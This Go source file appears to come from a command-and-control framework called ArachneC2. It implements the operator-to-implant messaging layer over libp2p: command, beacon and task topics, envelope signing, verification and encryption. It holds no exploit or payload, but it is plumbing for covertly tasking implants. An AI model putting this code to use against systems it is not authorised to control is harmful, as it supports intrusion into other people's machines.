package transport

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"runtime/debug"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/peer"

	apb "github.com/portbuster1337/ArachneC2/protobuf/apb"
	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
)

var ErrSignatureInvalid = fmt.Errorf("signature invalid")

type MessageHandler func(ctx context.Context, envelope *apb.Envelope, senderPub crypto.PubKey)

type Messenger struct {
	node          *Node
	handler       MessageHandler
	privKey       crypto.PrivKey
	operatorID    peer.ID
	trustedPubKey crypto.PubKey
	boxPubKey     *[32]byte
	knownImplants map[string]crypto.PubKey
	mu            sync.RWMutex
	seenIDs       map[int64]time.Time
	seenMu        sync.Mutex
}

const replayWindow = 5 * time.Minute

func (m *Messenger) IsReplay(id int64) bool {
	m.seenMu.Lock()
	defer m.seenMu.Unlock()

	if m.seenIDs == nil {
		m.seenIDs = make(map[int64]time.Time)
	}

	if _, dup := m.seenIDs[id]; dup {
		return true
	}

	m.seenIDs[id] = time.Now()

	if len(m.seenIDs) > 10000 {
		cutoff := time.Now().Add(-replayWindow)
		for k, v := range m.seenIDs {
			if v.Before(cutoff) {
				delete(m.seenIDs, k)
			}
		}
	}

	return false
}

func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		operatorID:    node.ID(),
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey, operatorPub crypto.PubKey, boxPubKey *[32]byte) *Messenger {
	opID, err := peer.IDFromPublicKey(operatorPub)
	if err != nil {
		opID = peer.ID("")
	}
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		operatorID:    opID,
		trustedPubKey: operatorPub,
		boxPubKey:     boxPubKey,
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func (m *Messenger) SetHandler(handler MessageHandler) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.handler = handler
}

func (m *Messenger) AddKnownImplant(peerID string, pub crypto.PubKey) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.knownImplants[peerID] = pub
}

func (m *Messenger) KnownImplant(peerID string) crypto.PubKey {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.knownImplants[peerID]
}

// CommandTopic returns the topic where operators publish commands.
// Format: /arachne/<operator-peerid>/commands
func (m *Messenger) CommandTopic() string {
	return CommandTopicPrefix + m.operatorID.String() + CommandsSuffix
}

// BeaconTopic returns the topic where implants publish beacons.
// Format: /arachne/<operator-peerid>/beacons
func (m *Messenger) BeaconTopic() string {
	return BeaconTopicPrefix + m.operatorID.String() + BeaconsSuffix
}

// TaskTopic returns a per-implant topic for targeted commands.
// Format: /arachne/<operator-peerid>/tasks/<implant-peerid>
func (m *Messenger) TaskTopic(implantPeerID string) string {
	return BeaconTopicPrefix + m.operatorID.String() + TasksSuffix + implantPeerID
}

func EnvelopeSigningBytes(env *apb.Envelope) ([]byte, error) {
	signingEnv := &apb.Envelope{
		ID:   env.ID,
		Type: env.Type,
		Data: env.Data,
	}
	return proto.Marshal(signingEnv)
}

func VerifyEnvelope(env *apb.Envelope, trustedPub crypto.PubKey) error {
	if trustedPub == nil {
		return fmt.Errorf("no trusted public key configured")
	}
	if len(env.Signature) == 0 {
		return fmt.Errorf("%w: missing signature", ErrSignatureInvalid)
	}
	signingData, err := EnvelopeSigningBytes(env)
	if err != nil {
		return fmt.Errorf("marshal signing data: %w", err)
	}
	ok, err := cryptography.Verify(trustedPub, signingData, env.Signature)
	if err != nil {
		return fmt.Errorf("verify: %w", err)
	}
	if !ok {
		return ErrSignatureInvalid
	}
	return nil
}

func PubKeyFromEnvelope(env *apb.Envelope) (crypto.PubKey, error) {
	if len(env.SenderKey) == 0 {
		return nil, fmt.Errorf("no sender key in envelope")
	}
	return cryptography.PubKeyFromBytes(env.SenderKey)
}

func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted func() crypto.PubKey) error {
	sub, err := m.node.Subscribe(topic)
	if err != nil {
		return fmt.Errorf("subscribe %s: %w", topic, err)
	}
	go func() {
		defer sub.Cancel()
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[messenger] panic in listenVerified: %v\n%s", r, debug.Stack())
			}
		}()
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				return
			}
			env := &apb.Envelope{}
			if err := proto.Unmarshal(msg.Data, env); err != nil {
				continue
			}

			trusted := getTrusted()
			if trusted == nil {
				trusted, err = PubKeyFromEnvelope(env)
				if err != nil {
					continue
				}
				senderID, idErr := peer.IDFromPublicKey(trusted)
				if idErr == nil {
					if stored := m.KnownImplant(senderID.String()); stored != nil {
						trusted = stored
					}
				}
			}

			if err := VerifyEnvelope(env, trusted); err != nil {
				continue
			}
			go m.deliver(ctx, env)
		}
	}()
	return nil
}

func (m *Messenger) ListenBeacons(ctx context.Context) error {
	return m.listenVerified(ctx, m.BeaconTopic(), func() crypto.PubKey {
		return nil
	})
}

func (m *Messenger) ListenCommands(ctx context.Context) error {
	return m.listenVerified(ctx, m.CommandTopic(), func() crypto.PubKey {
		m.mu.RLock()
		defer m.mu.RUnlock()
		return m.trustedPubKey
	})
}

func (m *Messenger) ListenTask(ctx context.Context, implantPeerID string) error {
	return m.listenVerified(ctx, m.TaskTopic(implantPeerID), func() crypto.PubKey {
		m.mu.RLock()
		defer m.mu.RUnlock()
		return m.trustedPubKey
	})
}

func (m *Messenger) deliver(ctx context.Context, env *apb.Envelope) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[messenger] panic in deliver: %v\n%s", r, debug.Stack())
		}
	}()
	m.mu.RLock()
	handler := m.handler
	m.mu.RUnlock()
	if handler == nil {
		return
	}
	var pubKey crypto.PubKey
	if len(env.SenderKey) > 0 {
		pubKey, _ = PubKeyFromEnvelope(env)
	}
	handler(ctx, env, pubKey)
}

func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *apb.Envelope) error {
	data, err := proto.Marshal(env)
	if err != nil {
		return fmt.Errorf("marshal envelope: %w", err)
	}
	return m.node.Publish(ctx, topic, data)
}

func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *apb.Envelope) error {
	if m.privKey == nil {
		return fmt.Errorf("no private key for signing")
	}

	if m.boxPubKey != nil && len(env.Data) > 0 {
		encrypted, err := cryptography.EncryptMessage(env.Data, m.boxPubKey)
		if err != nil {
			return fmt.Errorf("encrypt: %w", err)
		}
		env.Data = encrypted
	}

	signingData, err := EnvelopeSigningBytes(env)
	if err != nil {
		return fmt.Errorf("marshal signing data: %w", err)
	}
	sig, err := m.privKey.Sign(signingData)
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}
	env.Signature = sig

	pubBytes, err := crypto.MarshalPublicKey(m.privKey.GetPublic())
	if err == nil {
		env.SenderKey = pubBytes
	}
	return m.SendEnvelope(ctx, topic, env)
}

func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *apb.Envelope {
	return &apb.Envelope{
		ID:   rand.Int63(),
		Type: msgType,
		Data: data,
	}
}

func (m *Messenger) RendezvousString() string {
	return "arachne/" + m.operatorID.String()
}

func (m *Messenger) OperatorID() peer.ID {
	return m.operatorID
}

func (m *Messenger) SetOperatorID(id peer.ID) {
	m.operatorID = id
}
